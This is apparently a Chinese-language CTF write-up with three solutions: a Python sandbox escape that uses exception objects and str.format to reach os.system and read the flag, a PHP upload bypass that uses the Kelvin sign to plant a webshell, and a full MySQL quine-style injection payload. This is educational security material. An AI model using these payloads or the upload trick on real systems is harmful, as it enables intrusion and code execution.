### 思考

#### 如何通过异常对象拿到执行命令的能力

在 Python 中，`__traceback__` 是一个特殊的属性，它存在于 **异常对象（Exception objects）** 中。简单来说，它是异常发生时的“现场快照”，记录了程序崩溃时的调用栈信息。

当 Python 抛出一个异常时，它会为该异常关联一个 `traceback` 对象。这个对象存储在异常实例的 `__traceback__` 属性里。

```python
try:
    1 / 0
except Exception as e:
    # e 是异常实例
    # e.__traceback__ 包含了导致错误的代码位置、调用链等
    print(e.__traceback__) 
    # 输出类似于: <traceback object at 0x7f88...>
```

`traceback` 对象本身是一条 **链表**。你可以通过它不断向上或向下寻找函数帧（Frame），从而获取本不该获取的变量。

它包含以下关键子属性：

- `tb_next`: 指向调用堆栈中的下一个（更深层的）追踪对象。
- `tb_frame`: 指向当前追踪对象对应的 **栈帧对象（Frame object）**。
- `tb_frame.f_locals`: **这是 CTF 的核心！** 它是一个字典，包含了该栈帧中所有的局部变量。
- `tb_frame.f_builtins` 是栈帧对象（Frame object）中的一个属性，它是一个**字典**，包含了当前栈帧环境下可以使用的所有**内建函数和异常**。

也就是说我们可以用下面这条链子拿到import

#### 如何绕过字符数量限制

在 Python 中，`str.format()` 是一种强大的字符串格式化方法。`str.format()` 有一个非常有杀伤力的特性：**它可以访问对象的属性（Attribute Access）**。在 SSTI 场景下，如果你能控制格式化字符串（花括号里的内容），即使你不能直接执行代码，你也可以通过 `format` **泄露内存中的全局变量和配置信息**。

```python
# 假设有一个全局对象 self 或 request
"{self.__init__.__globals__}".format(self=some_obj)
```

当你写： `"{0.__traceback__.tb_frame.f_builtins[eval]}"` 你实际上是**获取**了 `eval` 这个函数对象。

注意，这个方法里面不能调用函数，只能获取函数对象！！！

那么在字符串里面我们就可以用十六进制绕过了

### 开干

#### 首先我们构造一个异常信息

```
0/1
```

这样会抛出`ZeroDivisionError`异常信息

#### 下一步我们获得import

```py
"{0\x2e__traceback__\x2etb_frame\x2ef_builtins[__import__]\x2e__dummy__}".format(ex)
```

实际含义是

```py
"{0.__traceback__.tb_frame.f_builtins[__import__].__dummy__}".format(ex)
```

故意访问一个不存在的属性 \_\_dummy__，于是抛出 AttributeError。

这一步的目的不是拿返回值，而是利用异常本身：

- 新的 ex 变成这个 AttributeError
- AttributeError.obj 会保存“哪个对象触发了属性错误”
- 这里它保存的就是 \<built-in function __import\_\_\>

也就是说，这一轮结束后：

```py
ex.obj == __import__ 
```

#### 下面我们导入os模块

```
{}[ex.obj('os')]
```

这一步里：

- ex.obj 就是上一步留下的 \_\_import__
- ex.obj('os') 等价于 \_\_import__('os')

但是我们不能直接把结果保存在变量里，所以要借一个新的异常做“中转存储”。
这里用字典取值：

```
{}[os_module] 
```

因为空字典里没有这个 key，会抛 KeyError。
而 KeyError.args[0] 恰好就是那个“取不到的 key”，也就是模块对象 os。

这一轮结束后：

```
ex.args[0] == os
```

#### 从 os 模块里拿到 system

```
"{0\x2eargs[0]\x2esystem\x2e__dummy__}".format(ex) 
```

实际含义：

```
"{0.args[0].system.__dummy__}".format(ex)
```

于是新的异常对象里：

```
ex.obj == os.system
```

#### 执行命令读 flag

```
ex.obj("cat /f*")
```



## 剪影

一个文件上传器，给出了部分代码

```php
<?php
if (isset($_FILES['file'])){
    $name = $_FILES['file']['name']; //获取上传的文件的原始文件名
    $tmp = $_FILES['file']['tmp_name']; //获取文件上传后的临时路径

    $path = mb_strtolower($name); //将原始文件名转换为小写
    $idx = strpos($path, '.txt'); //查找.txt第一次出现的位置
    $file = substr($name, 0, $idx + 4); //截断
    $ext = pathinfo($name, PATHINFO_EXTENSION);  //获取原始文件后缀名

    if ($ext === "txt"){
        if (move_uploaded_file($tmp, $file)){
            echo "文件上传成功.";
        }
    }
}
?>
```

这里我们发现了一个点，查找.txt第一次出现的位置用的是转换为小写的文件名，但是后面截断用的是原始的文件名，那么有没有这样一个字符，它的大写字符占位比小写字符占位多呢？

这里可以用 U+212A，也就是：

```
K 
```

它叫 Kelvin Sign。

它的特性是：

- 原始 UTF-8 编码是 3 字节：E2 84 AA
- mb_strtolower('K') 会变成 k
- 小写后只剩 1 字节

也就是说，前面每放一个 K，小写字符串和原始字符串的字节偏移就会多出 2 字节差。

那么我们构造这样一个文件名，内容是一句话木马


### 解决方法

#### make_set(bits, str1, str2...)

make_set函数返回一个字符串，根据`bits`来选取后面的字符串参数，如果某一位是1，就选中对应的字符串

比如`SELECT make_set(5, 'a', 'b', 'c', 'd');`

5转换成二进制是0101，从右向左是`1,0,1,0`，因此a和c会被选中，然后用逗号连接并输出`'a,c'`

#### quote(str)

quote会返回被单引号包裹的字符串并且能自动转义里面的特殊字符

quote('hello')	输出`'hello'`

quote("it's test")	输出`'it\'s a test'`

#### 派生表与列别名

可以用下面的方法代替`@a:`

```sql
SELECT s FROM (SELECT 'test string' AS s) AS t;
-- 或者在MYSQL8.0+中
SELECT s FROM (SELECT 0, 'test string', 0) t(x, s, y);
```

这里会创建一个临时表`t`，里面有一列叫`s`，值是`test string`。然后可以用`s`来引用这个值

比较新的这个写法是一个语法糖

`(SELECT 0, 'test string', 0)`：产生一行数据，有三列

`t(x, s, y)`：把这个临时表命名为`t`，第一二三列名分别对应`x`(0)、`s`('test string')、`y`(0)

### Payload构造

上面三个方法有什么用，怎么用？

make_set可以让select输出我们想要的东西，派生表是实现自己等于自己的关键一步（它定义了s）并且语法特性可以抵消make_set产生的逗号，那么临时表会再次使用主体内容，quote就可解决这部分的单引号问题

最终payload

```
'/*,*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0,'*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0',0)t(x,s,y)#
```

整个sql语句大致如下

```sql
SELECT pwd
FROM users
WHERE username='admin' and pwd=''
/*,*/
union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)
from (
  select 0,
         '*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0',
         0
) t(x,s,y)
#';
```

我们把make_set里面的四部分拆开分析

0x272f2a就是`'/*`，那么为什么要有`'/*,*/`这一部分？

如果前面用来闭合命令的单引号变成了主体s的一部分，在后面会混淆，不便于操作，中间的逗号正是迎合make_set的特性

s就是后面派生表中的内容`*/ union select make_set(15,0x272f2a,s,quote(s),0x30297428782c732c792923)from(select 0`

下面的`quote(s)`就是重复一下派生表中的字符串，并且加上单引号

0x30297428782c732c792923就是最后面的`0) t(x,s,y)`

如此一来注释中间的逗号和派生表中间的两个逗号正好解决了make_set的问题
